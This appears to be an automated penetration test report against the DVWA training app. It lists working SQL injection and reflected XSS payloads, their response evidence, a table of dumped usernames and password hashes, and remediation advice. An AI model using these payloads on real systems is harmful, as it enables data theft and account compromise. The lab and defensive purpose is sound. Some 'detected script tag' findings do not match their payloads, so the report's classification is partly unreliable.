# Automated Web Pentest Report

**Scan Date:** 2025-06-18T04:39:43.716188Z  
**Target:** DVWA (All modules)

## Test Environment

- **Server OS:** Kali GNU/Linux Rolling
- **Python Version:** 3.13.3
- **Scan Date:** 2025-06-18 04:39:43 UTC
- **SQLmap Version:** 1.9.4#stable
- **Target App:** DVWA (Damn Vulnerable Web Application)
- **Version:** 1.10 *Development*
- **Security Level:** low
- **Web Server:** Apache 2.4
- **Database:** MySQL 8
- **Language:** PHP 8.1
- **Tools Used:** Python requests, BeautifulSoup4, SQLmap, Burp Suite (manual verify)

---
## Methodology & Tools

- Automated Python script loads payloads from file, sends HTTP requests, extracts evidence with BeautifulSoup4.
- Auto-classifies results, exports as PDF/Markdown/JSON.
- SQLmap integration for advanced SQLi detection.
- Ready for CI/CD: can run in GitHub Actions/Jenkins.

---
## Executive Summary
- Total vulnerabilities tested: 14  
- Successful exploits: 13  
- Risk Level: **Critical**


---

## SQL Injection Test Cases

| # | Payload | Status | Severity |
|---|---------|--------|----------|
| 1 | `' OR '1'='1` | Success | Critical |
| 2 | `' OR 1=1 #` | Success | Critical |
| 3 | `' union select user, password from users#` | Success | Critical |
| 4 | `addadasddad` | Fail | Low |

---
### SQL Injection Evidence Details

**Severity:** `Critical`
#### Payload: `' OR '1'='1`
```
ID: ' OR '1'='1
First name: admin
Surname: admin

ID: ' OR '1'='1
First name: Gordon
Surname: Brown

ID: ' OR '1'='1
First name: Hack
Surname: Me

ID: ' OR '1'='1
First name: Pablo
Surname: Picasso

ID: ' OR '1'='1
First name: Bob
Surname: Smith
```

**Severity:** `Critical`
#### Payload: `' OR 1=1 #`
```
ID: ' OR 1=1 #
First name: admin
Surname: admin

ID: ' OR 1=1 #
First name: Gordon
Surname: Brown

ID: ' OR 1=1 #
First name: Hack
Surname: Me

ID: ' OR 1=1 #
First name: Pablo
Surname: Picasso

ID: ' OR 1=1 #
First name: Bob
Surname: Smith
```

**Severity:** `Critical`
#### Payload: `' union select user, password from users#`
```
ID: ' union select user, password from users#
First name: admin
Surname: 5f4dcc3b5aa765d61d8327deb882cf99

ID: ' union select user, password from users#
First name: gordonb
Surname: e99a18c428cb38d5f260853678922e03

ID: ' union select user, password from users#
First name: 1337
Surname: 8d3533d75ae2c3966d7e0d4fcc69216b

ID: ' union select user, password from users#
First name: pablo
Surname: 0d107d09f5bbe40cade3de5c71e9e9b7

ID: ' union select user, password from users#
First name: smithy
Surname: 5f4dcc3b5aa765d61d8327deb882cf99
```

**Severity:** `Low`
#### Payload: `addadasddad`
```
User ID:
```

---

## XSS Test Cases

| # | Payload | Status | Severity |
|---|---------|--------|----------|
| 1 | `<script>alert('XSS')</script>` | Success | High |
| 2 | `"><img src=x onerror=alert(1)>` | Success | High |
| 3 | `<svg/onload=alert(1)>` | Success | High |
| 4 | `<body onload=alert('xss')>` | Success | High |
| 5 | `"><svg onload=alert('xss')>` | Success | High |
| 6 | `<script>alert('XSS')</script>` | Success | High |
| 7 | `"><img src=x onerror=alert(1)>` | Success | High |
| 8 | `<svg/onload=alert(1)>` | Success | High |
| 9 | `<body onload=alert('xss')>` | Success | High |
| 10 | `"><svg onload=alert('xss')>` | Success | High |

---
### XSS Evidence Details

**Severity:** `High`
#### Payload: `<script>alert('XSS')</script>`
```
Payload reflected: <script>alert('XSS')</script>

Detected <script> tag in response.

Detected alert() in response.
```

**Severity:** `High`
#### Payload: `"><img src=x onerror=alert(1)>`
```
Payload reflected: "><img src=x onerror=alert(1)>

Detected <script> tag in response.

Detected alert() in response.

Detected image/event XSS payload.
```

**Severity:** `High`
#### Payload: `<svg/onload=alert(1)>`
```
Payload reflected: <svg/onload=alert(1)>

Detected <script> tag in response.

Detected alert() in response.
```

**Severity:** `High`
#### Payload: `<body onload=alert('xss')>`
```
Payload reflected: <body onload=alert('xss')>

Detected <script> tag in response.

Detected alert() in response.
```

**Severity:** `High`
#### Payload: `"><svg onload=alert('xss')>`
```
Payload reflected: "><svg onload=alert('xss')>

Detected <script> tag in response.

Detected alert() in response.
```

**Severity:** `High`
#### Payload: `<script>alert('XSS')</script>`
```
Detected <script> tag in response.
```

**Severity:** `High`
#### Payload: `"><img src=x onerror=alert(1)>`
```
Detected <script> tag in response.
```

**Severity:** `High`
#### Payload: `<svg/onload=alert(1)>`
```
Detected <script> tag in response.
```

**Severity:** `High`
#### Payload: `<body onload=alert('xss')>`
```
Detected <script> tag in response.
```

**Severity:** `High`
#### Payload: `"><svg onload=alert('xss')>`
```
Detected <script> tag in response.
```

---
## Extracted Users

| # | Username | Password/Hash |
|---|----------|---------------|
| 1 | admin | 5f4dcc3b5aa765d61d8327deb882cf99 |
| 2 | gordonb | e99a18c428cb38d5f260853678922e03 |
| 3 | 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b |
| 4 | pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 |
| 5 | smithy | 5f4dcc3b5aa765d61d8327deb882cf99 |

---
## Recommendations
- Use prepared statements (parameterized queries) for all database access.
- Enable a Web Application Firewall (e.g., ModSecurity + CRS) in production.
- Build a code review checklist for input validation and output encoding.
- Patch DVWA and all dependencies regularly.
- Integrate automated security testing (e.g., SonarQube, OWASP ZAP) into CI/CD.
- Regularly update payload signatures and review recent CVE advisories.

---
## References
- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
- PayloadAllTheThings SQLi: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
- DVWA GitHub: https://github.com/digininja/DVWA
- SQLmap: http://sqlmap.org/
- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/

---
